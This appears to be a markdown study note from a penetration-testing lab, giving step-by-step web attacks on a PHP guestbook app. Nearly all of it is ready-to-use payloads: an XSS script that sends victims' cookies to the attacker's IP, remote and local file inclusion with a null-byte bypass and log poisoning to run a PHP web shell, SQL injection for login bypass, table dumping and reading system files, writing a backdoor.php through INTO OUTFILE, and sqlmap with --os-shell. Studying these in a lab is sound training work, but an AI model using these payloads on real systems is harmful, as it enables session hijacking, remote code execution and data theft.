#Webapps

##Getting Started
1. Start XAMPP and apache/mysql

2. Navigate to the host in your webbrowser (should be a guestbook application)

## XSS

The sign in page isn't filtered and so you can submit javascript which will run when someone views your comment

In this case I posted `<script>alert("XSS");</script>` which when viewed simply pops up the message "XSS"

XSS can be leveraged to do many things but as an example...

1. Create a comment with an iframe pointing to your ip `<iframe src="http://yo.ur.ip.addr:81/report" width="0" height="0"></iframe>`

2. Setup a listener on your machine `nc -lvp 81` 

3. visit the site from a victims machine and you will see a connection, you can use this to exploit the browser, gather information or grab cookies

**Grabbing Cookies**

1. Submit a comment with the following JS `<script> new Image().src="http://10.11.0.74:81/bogus.php"+document.cookie; </script>`

2. Setup a listener on your machine `nc -lvp 81` 

3. Visit the page as an admin

3. You will see that the cookie has been appended to the url your listener picks up

4. We can steal this cookie and login as the user, edit cookies using your browsers console `document.cookie = "PHPSESSID=34015asdsad08f566d00635a6e8ae98"`

## Remote File Inclusions

1. Whilst testing the website we notice that the language dropdown on the signin page appears to grab data from a file

2. We can see this on examining the source code

   ```
   if (isset( $_GET['LANG'] )) { 
     $lang = $_GET['LANG'];
   } else { 
     $lang = 'en';
   }
   include( $lang . '.php' );
   ```

3. We can see the parameters in the URL so tweaking the lang param to our own file is trivial

   `http://10.11.5.115/addguestbook.php?name=hacker&comment=test&LANG=fr&Submit=Submit`
   `http://10.11.5.115/addguestbook.php?name=hacker&comment=test&LANG=http://10.11.0.74/evil.txt&Submit=Submit`

4. Create our evil file `echo '<?php echo shell_exec("ipconfig"); ?>' >> /var/www/evil.txt`

5. Start apache `service apache2 start`

6. When we navigate to the site we can see that the script appended `.php` onto the end of our request

7. We can get around this by using a null byte (which works in php <=5.3) and causes php to ignore everything after it

   `http://10.11.5.115/addguestbook.php?name=hacker&comment=test&LANG=http://10.11.0.74/evil.txt%00&Submit=Submit`

8. Navigate again to the site and we get the output of the ipconfig command


**Notes**

Might be turned off in php.ini file look for `allow_url_fopen` and `allow_url_include`

##Local File Inclusion

Even with remote file includes turned off it's still possible to run local files and it may be possible to posion log files in order to run php of our choosing.

1. Connect to the webserver using nc `nc -nv 10.11.5.115 80` and paste `<?php echo shell_exec($_GET['cmd']); ?>`

2. Check the access log  on your victims machine to confirm you have posioned the log file 

3. We can now attempt to include the log by navigating to

    `http://10.11.5.115/addguestbook.php?name=hacker&comment=test&cmd=ipconfig&LANG=../../../../../../../xampp/apache/logs/access.log%00&Submit=Submit`

##SQL Injection (SQLi)

**Authentication Bypass**

Fairly simply hack our goal is to change a query from `SELECT * FROM USERS WHERE username="admin" AND password="XXXX"` to `SELECT * FROM USERS WHERE username="admin" or 1=1;#" AND password="XXXX"`

Once we gain control we can use limit's to ensure we only get one record if necessary

**Error Based Enumeration**

1. Test a field using `'` or `"` if you can see the errors you can glean extra information

2. Using order by you can manipulate the SQL to let you know how many columns are in the table 

    i.e at url `http://10.11.5.115/comment.php?id=738 order by 7` we run the SQL `SELECT * FROM guestbook where id = 738 order by 7` giving us the error `Unknown column '7' in 'order clause'`

3. Now that we now the number of columns in the table we can use `union all` to interegrate the data, remember that we need to return the same number of columns in our union

4. Using a basic union we will tag our columns to find out which/where they might be output

    `http://10.11.5.115/comment.php?id=738 UNION SELECT 1,2,3,4,5,6`

5. Now we can start enumerating using our union statements

    Version: `10.11.5.115/comment.php?id=738 UNION SELECT 1,2,3,4,@@version,6`
    
    User: `10.11.5.115/comment.php?id=738 UNION SELECT 1,2,3,4,user(),6`

6. In this case we are running as root so we can enumerate more heavily

    All Tables: `10.11.5.115/comment.php?id=738 UNION SELECT 1,2,3,4,table_name,6 FROM information_schema.tables`
    
    Get columns for a specific table: `10.11.5.115/comment.php?id=738 UNION SELECT 1,2,3,4,column_name,6 FROM information_schema.columns where table_name="users"`

7. Then it's just a case of dumping data of that table

    `http://10.11.5.115/comment.php?id=738%20UNION%20SELECT%201,2,name,4,password,6%20FROM%20users`

##Blind SQL Injection

Used at times you can't find errors

1. We confirm injection by first appending a true statement and then a false statement and seeing if we get different results

    ```
    10.11.5.115/comment.php?id=738 AND 1=1;# 
    10.11.5.115/comment.php?id=738 AND 1=2;#
    ```

2. It can also be confirmed using a sleep statement

    ```
    10.11.5.115/comment.php?id=738-sleep(5)
    ```

3. This can then be tied together to enumerate information out of the database

    ```
    10.11.5.115/comment.php?id=738 AND MID(@@version,1,1) = '5';#
    10.11.5.115/comment.php?id=738-IF(MID(@@version,1,1) = '5',SLEEP(5),0)
    ```

##SQL Read/Write
Using our union from before it's possible under certain circumstances to read files

**Reading**

```
10.11.5.115/comment.php?id=738 UNION SELECT 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6
```

**Writing**

```
10.11.5.115/comment.php?id=738 UNION ALL SELECT 1,2,3,4,"<?php echo shell_exec($_GET['cmd']); ?>",6 INTO OUTFILE 'c:/xampp/htdocs/backdoor.php'
```

##SQL Map

SQL map can be used to identify/exploit SQLi vulns

Uses
```
sqlmap -u http://10.11.5.115 --crawl=1
sqlmap -u http://10.11.5.115/comment.php?id=738 --dbms=mysql --dump --threads=5
sqlmap -u http://10.11.5.115/comment.php?id=738 --dbms=mysql --os-shell
```
